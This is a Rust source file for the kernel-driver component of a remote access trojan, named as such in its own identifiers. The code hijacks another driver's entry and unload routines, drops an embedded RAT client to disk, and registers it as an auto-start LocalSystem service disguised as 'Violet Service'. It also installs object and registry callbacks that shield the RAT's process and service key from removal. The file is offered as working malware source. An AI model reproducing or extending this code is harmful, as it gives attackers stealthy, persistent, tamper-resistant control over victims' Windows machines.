use alloc::boxed::Box;
use core::ffi::c_void;
use core::sync::atomic::Ordering;
use core::{mem, ptr, slice};

use aho_corasick::AhoCorasickBuilder;
use rat_common::utils::DropGuard;
use rat_common::windows::PROCESS_PROTECTED_ACCESS;
use rat_common::windows::kernel::KernelHandoff;
use wdk::{self, nt_success};
use wdk_sys::_MODE::KernelMode;
use wdk_sys::ntddk::{
    CmUnRegisterCallback, IoDeleteDevice, IoDeleteSymbolicLink, KeDelayExecutionThread,
    ObUnRegisterCallbacks, PsCreateSystemThread, RtlInitUnicodeString, ZwClose, ZwCreateKey,
};
use wdk_sys::{
    HANDLE, KEY_ALL_ACCESS, LARGE_INTEGER, NTSTATUS, OBJ_CASE_INSENSITIVE, OBJ_KERNEL_HANDLE,
    OBJECT_ATTRIBUTES, PDRIVER_OBJECT, REG_EXPAND_SZ, REG_OPTION_NON_VOLATILE, REG_SZ,
    SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, SERVICE_WIN32_OWN_PROCESS, THREAD_ALL_ACCESS,
    UNICODE_STRING,
};
use widestring::{U16CStr, Utf16Str, u16cstr};

use crate::global::{
    CM_REGISTER_CALLBACK_COOKIE, DOS_NAME, MAX_INITIALIZE_ATTEMPTS, OB_REGISTER_CALLBACKS_HANDLE,
    OBJ_PATH_AHO_CORASICK, ORIGINAL_DRIVER_ENTRY_COMPLETED, ORIGINAL_DRIVER_OBJECT,
    ORIGINAL_DRIVER_UNLOAD, RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_OBJ_PATH_SELF_DEFENSE,
    RAT_CLIENT_OBJ_PATH_SELF_DEFENSE_FLAG, RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY,
    RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE, SERVICE_REGISTRY_AHO_CORASICK,
};
use crate::handlers::registry::cm_register_callback;
use crate::handlers::{irp, object};
use crate::wrappers::bindings::InitializeObjectAttributes;
use crate::wrappers::{fs, registry};
use crate::{error, info, warn};

type DriverUnloadFn = unsafe extern "C" fn(driver: PDRIVER_OBJECT);

unsafe extern "C" fn initialize_thread_routine(extra: *mut c_void) {
    let extra = unsafe { Box::from_raw(extra.cast()) };
    let mut sleep = LARGE_INTEGER { QuadPart: -3000000 }; // 300 ms

    for retry in 0..MAX_INITIALIZE_ATTEMPTS {
        info!(
            "Initialization attempt #{}/{MAX_INITIALIZE_ATTEMPTS}",
            retry + 1,
        );
        let status = unsafe { KeDelayExecutionThread(KernelMode as i8, 0, &mut sleep) };
        if !nt_success(status) {
            error!("KeDelayExecutionThread error: 0x{status:X}");
            break;
        }

        if initialize(&extra).is_ok() {
            return;
        }
    }

    error!("Failed to initialize after {MAX_INITIALIZE_ATTEMPTS} attempts");
}

fn setup_service_registry(path: &U16CStr) -> anyhow::Result<()> {
    let mut attributes = OBJECT_ATTRIBUTES::default();
    let mut root_directory = UNICODE_STRING::default();
    unsafe {
        RtlInitUnicodeString(&mut root_directory, RAT_CLIENT_SERVICE_REGISTRY.as_ptr());
        InitializeObjectAttributes(
            &mut attributes,
            &mut root_directory,
            OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
            ptr::null_mut(),
            ptr::null_mut(),
        );
    }

    let mut key = HANDLE::default();
    let status = unsafe {
        ZwCreateKey(
            &mut key,
            KEY_ALL_ACCESS,
            &mut attributes,
            0,
            ptr::null_mut(),
            REG_OPTION_NON_VOLATILE,
            ptr::null_mut(),
        )
    };
    anyhow::ensure!(nt_success(status), "ZwCreateKey error: 0x{status:X}");

    let guard = DropGuard::new(key, |key| unsafe {
        let _ = ZwClose(key);
    });

    // Reference: https://learn.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree
    for status in [
        registry::registry_write_string(
            key,
            u16cstr!("DisplayName"),
            u16cstr!("Violet Service"),
            REG_SZ,
        ),
        registry::registry_write_string(
            key,
            u16cstr!("Description"),
            u16cstr!("Violet Service"),
            REG_SZ,
        ),
        registry::registry_write_string(key, u16cstr!("ImagePath"), path, REG_EXPAND_SZ),
        registry::registry_write_dword(key, u16cstr!("Type"), SERVICE_WIN32_OWN_PROCESS),
        registry::registry_write_dword(key, u16cstr!("Start"), SERVICE_AUTO_START),
        registry::registry_write_dword(key, u16cstr!("ErrorControl"), SERVICE_ERROR_NORMAL),
        registry::registry_write_string(
            key,
            u16cstr!("ObjectName"),
            u16cstr!("LocalSystem"),
            REG_SZ,
        ),
    ] {
        anyhow::ensure!(nt_success(status), "ZwSetValueKey error: 0x{status:X}");
    }

    drop(guard);
    Ok(())
}

fn drop_file() -> anyhow::Result<()> {
    let file = fs::File::create(RAT_CLIENT_OBJ_PATH.as_ptr())?;
    file.write(RAT_CLIENT)?;

    Ok(())
}

/// Interpret as a `&[u8]` slice for aho-corasick
fn u16cstr_to_buf(u16cstr: &U16CStr) -> &[u8] {
    unsafe {
        slice::from_raw_parts(
            u16cstr.as_ptr().cast(),
            u16cstr.len() * mem::size_of::<u16>(),
        )
    }
}

unsafe extern "C" fn set_protected_flags_thread_routine(_: *mut c_void) {
    let mut sleep = LARGE_INTEGER {
        QuadPart: -300000000,
    }; // 30 seconds
    let status = unsafe { KeDelayExecutionThread(KernelMode as i8, 0, &mut sleep) };
    if nt_success(status) {
        RAT_CLIENT_OBJ_PATH_SELF_DEFENSE_FLAG.store(PROCESS_PROTECTED_ACCESS, Ordering::Release);
        info!("Set process self-defense flags to 0x{PROCESS_PROTECTED_ACCESS:X}");
    } else {
        error!("KeDelayExecutionThread error: 0x{status:X}");
    }
}

fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
    let mut success = true;
    match drop_file() {
        Ok(_) => match setup_service_registry(RAT_CLIENT_SERVICE_PATH) {
            Ok(_) => info!("Service registry setup successfully"),
            Err(e) => {
                success = false;
                error!("Failed to setup service registry: {e}");
            }
        },
        Err(e) => {
            error!("Failed to drop RAT client: {e}");
            success = false;
        }
    }

    match AhoCorasickBuilder::new()
        .ascii_case_insensitive(true)
        .build([u16cstr_to_buf(RAT_CLIENT_OBJ_PATH_SELF_DEFENSE)])
    {
        Ok(ac) => {
            info!("Constructed Aho-Corasick automaton for object path");
            let ac = OBJ_PATH_AHO_CORASICK.swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel);
            if !ac.is_null() {
                unsafe {
                    let _ = Box::from_raw(ac);
                }
            }
        }
        Err(e) => {
            success = false;
            error!("Failed to build Aho-Corasick automaton for object path: {e}");
        }
    }

    match object::ob_register_callbacks(extra) {
        Ok(handle) => {
            info!("Registered object callbacks");

            let handle = OB_REGISTER_CALLBACKS_HANDLE.swap(handle, Ordering::AcqRel);
            if !handle.is_null() {
                unsafe {
                    ObUnRegisterCallbacks(handle);
                }
            }

            let status = unsafe {
                PsCreateSystemThread(
                    ptr::null_mut(),
                    THREAD_ALL_ACCESS,
                    ptr::null_mut(),
                    ptr::null_mut(),
                    ptr::null_mut(),
                    Some(set_protected_flags_thread_routine),
                    ptr::null_mut(),
                )
            };
            if !nt_success(status) {
                error!("Cannot create thread to set process protection flags: 0x{status:X}");
            }
        }
        Err(e) => {
            success = false;
            error!("Failed to register object callbacks: {e}");
        }
    }

    match AhoCorasickBuilder::new()
        .ascii_case_insensitive(true)
        .build([u16cstr_to_buf(RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE)])
    {
        Ok(ac) => {
            info!("Constructed Aho-Corasick automaton for service registry");
            let ac =
                SERVICE_REGISTRY_AHO_CORASICK.swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel);
            if !ac.is_null() {
                unsafe {
                    let _ = Box::from_raw(ac);
                }
            }
        }
        Err(e) => {
            success = false;
            error!("Failed to build Aho-Corasick automaton for service registry: {e}");
        }
    }

    let driver = ORIGINAL_DRIVER_OBJECT.load(Ordering::Acquire);
    match cm_register_callback(driver) {
        Ok(cookie) => {
            info!("Registered registry callbacks");

            let cookie =
                CM_REGISTER_CALLBACK_COOKIE.swap(unsafe { cookie.QuadPart }, Ordering::AcqRel);
            if cookie != 0 {
                unsafe {
                    let _ = CmUnRegisterCallback(LARGE_INTEGER { QuadPart: cookie });
                }
            }
        }
        Err(e) => {
            success = false;
            error!("Failed to register registry callbacks: {e}");
        }
    }

    match irp::create_device(driver) {
        Ok(_) => info!("Created device"),
        Err(e) => {
            success = false;
            error!("Failed to create device: {e}");
        }
    }

    anyhow::ensure!(success, "At least 1 initialization routine failed");
    Ok(())
}

fn remove_registered_services(driver: PDRIVER_OBJECT) {
    if let Some(driver) = unsafe { driver.as_ref() }
        && !driver.DeviceObject.is_null()
    {
        let device = driver.DeviceObject;
        info!("Removing device object: {device:p}");

        let mut dos_name = UNICODE_STRING::default();
        unsafe {
            RtlInitUnicodeString(&mut dos_name, DOS_NAME.as_ptr());
            let status = IoDeleteSymbolicLink(&mut dos_name);
            if !nt_success(status) {
                warn!("IoDeleteSymbolicLink error: 0x{status:X}");
            }

            IoDeleteDevice(device);
        }
    }

    let cookie = CM_REGISTER_CALLBACK_COOKIE.swap(0, Ordering::AcqRel);
    if cookie != 0 {
        info!("Unregistering registry callbacks");
        let status = unsafe { CmUnRegisterCallback(LARGE_INTEGER { QuadPart: cookie }) };
        if !nt_success(status) {
            warn!("CmUnRegisterCallback error: 0x{status:X}");
        }
    }

    let ac = SERVICE_REGISTRY_AHO_CORASICK.swap(ptr::null_mut(), Ordering::AcqRel);
    if !ac.is_null() {
        info!("Dropping Aho-Corasick automaton");
        unsafe {
            let _ = Box::from_raw(ac);
        }
    }

    let handle = OB_REGISTER_CALLBACKS_HANDLE.swap(ptr::null_mut(), Ordering::AcqRel);
    if !handle.is_null() {
        info!("Unregistering object callbacks");
        unsafe {
            ObUnRegisterCallbacks(handle);
        }
    }
}

unsafe extern "C" fn driver_unload(driver: PDRIVER_OBJECT) {
    info!("DriverUnload: driver={driver:p}");
    let old_driver_unload_ptr = ORIGINAL_DRIVER_UNLOAD.load(Ordering::Acquire);
    if !old_driver_unload_ptr.is_null() {
        unsafe {
            let old_driver_unload =
                mem::transmute::<*mut u8, DriverUnloadFn>(old_driver_unload_ptr);
            old_driver_unload(driver);
        }
    }

    remove_registered_services(driver);
}

pub fn driver_entry_prehook(
    driver: PDRIVER_OBJECT,
    registry_path: Option<&Utf16Str>,
    extra: &KernelHandoff,
) -> anyhow::Result<()> {
    info!("DriverEntry: driver={driver:p}, registry_path={registry_path:?}");
    let mut thread = ptr::null_mut();

    ORIGINAL_DRIVER_OBJECT.store(driver, Ordering::Release);
    let status = unsafe {
        PsCreateSystemThread(
            &mut thread,
            THREAD_ALL_ACCESS,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            Some(initialize_thread_routine),
            Box::into_raw(Box::new(extra.clone())).cast(),
        )
    };
    anyhow::ensure!(
        nt_success(status),
        "PsCreateSystemThread error: 0x{status:X}",
    );

    Ok(())
}

pub fn driver_entry_posthook(
    driver: PDRIVER_OBJECT,
    _: Option<&Utf16Str>,
    status: NTSTATUS,
    _: &KernelHandoff,
) -> anyhow::Result<()> {
    info!("Original DriverEntry returned with status: 0x{status:X}");
    ORIGINAL_DRIVER_ENTRY_COMPLETED.store(true, Ordering::Release);

    if let Some(driver) = unsafe { driver.as_mut() } {
        if let Some(unload) = driver.DriverUnload {
            ORIGINAL_DRIVER_UNLOAD.store(unload as *mut u8, Ordering::Release);
        }

        driver.DriverUnload = Some(driver_unload);
    }

    Ok(())
}
